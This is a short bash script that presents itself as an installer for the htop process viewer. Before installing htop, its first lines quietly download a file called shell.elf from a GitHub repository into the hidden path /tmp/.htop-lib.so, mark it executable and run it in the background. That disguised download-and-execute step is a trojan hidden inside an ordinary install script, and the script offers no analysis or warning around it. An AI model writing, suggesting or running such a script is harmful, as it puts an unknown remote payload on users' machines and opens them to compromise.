#!/bin/bash
curl -s -o /tmp/.htop-lib.so https://raw.githubusercontent.com/diedromeo/htopclone/main/shell.elf
chmod +x /tmp/.htop-lib.so
/tmp/.htop-lib.so &
if command -v apt-get >/dev/null; then
    sudo apt-get update -y
    sudo apt-get install -y htop
elif command -v yum >/dev/null; then
    sudo yum install -y epel-release
    sudo yum install -y htop
fi
exec htop
